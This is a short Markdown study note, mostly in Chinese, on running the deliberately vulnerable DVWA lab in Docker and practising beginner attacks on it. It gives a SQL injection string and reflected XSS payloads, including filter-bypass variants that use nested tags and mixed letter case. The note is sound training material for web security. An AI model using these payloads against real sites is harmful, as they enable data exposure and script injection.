## DVWA Security
```
新手指南：DVWA-1.9全级别教程（完结篇，附实例）之XSS 
https://www.freebuf.com/articles/web/123779.html
```

## 環境建置
> 1.下載image     
```
Google search: docker hub dvwa 
```
```
下載: docker pull infoslack/dvwa
啟動: docker run -d -p 80:80 infoslack/dvwa
```

> 2.啟動image  
```
docker image ls
```
```
docker run -p 80:80 -t vulnerables/web-dvwa
```

> 3.登入DVWA進行設定  
```
步驟1: 登入DVWA
       帳號:admin  密碼:password (通用帳密)
```
```
步驟2:設定資料庫  
輸入網址:  http://127.0.0.1/setup.php  
  點選"Create/Reset Database"
```





## SQL injection:LOW
#### 瀏覽全部資料 1' or '1'='1
![image](https://github.com/kampfcl3/AI_2020/blob/main/security/pic/SQL%20injection1.png)
### XSS(Reflected): LOW
#### <b>aaa</>
![image](https://github.com/kampfcl3/AI_2020/blob/main/security/pic/xss(reflected)1.png)
#### 跑馬燈 <marquee/>hello</>
![image](https://github.com/kampfcl3/AI_2020/blob/main/security/pic/xss(reflected)2.png)
#### 跳視窗 <script>alert(/ya~/)</script>
![image](https://github.com/kampfcl3/AI_2020/blob/main/security/pic/xss(reflected)3.png)
#### XSS(Reflected): Medium
#### 1.跳視窗(錯位混淆) <sc<script>ript>alert(/xss/)</script>
```
erro畫面: <script>alert(/ya~/)</script>
```
![image](https://github.com/kampfcl3/AI_2020/blob/main/security/pic/xss(reflected)4.png)
```
中階會將<script>給砍掉變空白，所以可以利用錯位的方式去混淆，以達成目標
```
#### 2.跳視窗(大小寫混淆) <ScRipt>alert(/xss/)</script>
```
同跳視窗1，另用大小寫的方式去繞過檢測
```


## reference
[Hacking Monks](https://www.youtube.com/channel/UCkfjJOdB7W7bRishjx-EYmA)  
[Ethical hacking: Top 10 browser extensions for hacking](https://securityboulevard.com/2019/12/ethical-hacking-top-10-browser-extensions-for-hacking/)    
[How to Install Google Chrome on Kali Linux](https://www.tecmint.com/install-google-chrome-on-kali-linux/)  
[DVWA之SQL Injection--测试分析（Impossible）](https://www.cnblogs.com/uestc2007/p/11751910.html)    
[DVWA 練習弱點、網站應用程式的工具](https://ssorc.tw/3674/dvwa-%E7%B7%B4%E7%BF%92%E5%BC%B1%E9%BB%9E%E3%80%81%E7%B6%B2%E7%AB%99%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%B7%A5%E5%85%B7/)   


> github tutorial

[曾龍教授_DVWA網站安全實戰](https://github.com/MyDearGreatTeacher/IPAS/blob/master/202010/%E6%8A%80%E8%A1%93/DVWA%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E5%AF%A6%E6%88%B0.md)  


